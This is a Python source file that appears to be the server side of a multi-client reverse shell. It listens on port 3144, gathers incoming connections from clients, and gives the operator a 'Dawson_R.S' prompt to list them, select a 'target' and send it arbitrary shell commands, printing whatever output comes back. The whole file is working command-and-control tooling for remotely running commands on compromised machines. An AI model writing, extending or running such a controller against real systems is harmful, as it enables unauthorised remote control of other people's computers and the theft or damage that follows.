#TODO: Refactor and create Server class

import socket
import os
import time
import threading
from queue import Queue



NUM_THREADS = 2
JOB_NUM = [1,2]
queue = Queue()
all_connections = []
all_addresses = []

# create socket to allow connection to a client


def create_socket():

    try:
        global host
        global port
        global s
        host = ''
        port = 3144
        s = socket.socket()
        print("Creating socket")
    except socket.error as msg:
        print("Socket Creation Error: " + str(msg))

# bind socket to port and wait for connection from client


def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        print("Listening for connections")
        s.listen(5)
    except socket.error as msg:
        print("Binding Error: " + str(msg) + '\n' + 'Retrying in 5 seconds...')
        time.sleep(5)
        bind_socket()

# Accept connections from clients and list them


def connection_accept():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\n Connection has been established with " + address[0] + " at Port: " + str(address[1]))
        except:
            print("Error accepting connection from client")


# Interactive prompt for sending custom commands

def start_custom_shell():
    while 1:

        command = input("Dawson_R.S/> ")

        if len(command.strip()) == 0:
            continue
        elif command == 'exit':
            print("Terminating Program...")
            os._exit(0)
        elif command == 'list':
            list_connections()
        elif 'select' in command:
            conn = get_target(command)
            if conn is not None:
                send_target_commands(conn)
        else:
            print(str(command) + " is not a recognized command")


# Display all current connections


def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '\t' + str(all_addresses[i][0]) + '\t'  + str(all_addresses[i][1]) + '\n'
    print('--------Clients---------' + '\n' + results)

# Select a target client


def get_target(command):
    try:
        target = int(command.replace('select ', ''))
        conn = all_connections[target]
        print("Server has connected to " + str(all_addresses[target][0] + ' at Port ' +  str(all_addresses[target][1])))
        print("Dawson_R.S@"+str(all_addresses[target][0]) + "> ", end='')
        return conn
    except:
        print("Not a valid connection. Please enter a valid index number")
        return None

# Connect with remote client


def send_target_commands(conn):

    while True:
        try:
            command  = input()
            if command == 'quit':
                print("Closing connection with client")
                break
            elif len(str.encode(command)) > 0:
                conn.send(str.encode(command))
                client_response = str(conn.recv(20480), 'utf-8')
                print(client_response, end='')

        except:
            print("Connection to client lost...")
            break


# Create Threads

def create_threads():
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job in queue ( one to handle connections, one to send commands)


def work():
    while True:

        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            connection_accept()
        if x == 2:
            start_custom_shell()
        queue.task_done()

#  Create jobs


def create_jobs():
    for x in JOB_NUM:
        queue.put(x)
    queue.join()


create_threads()
create_jobs()
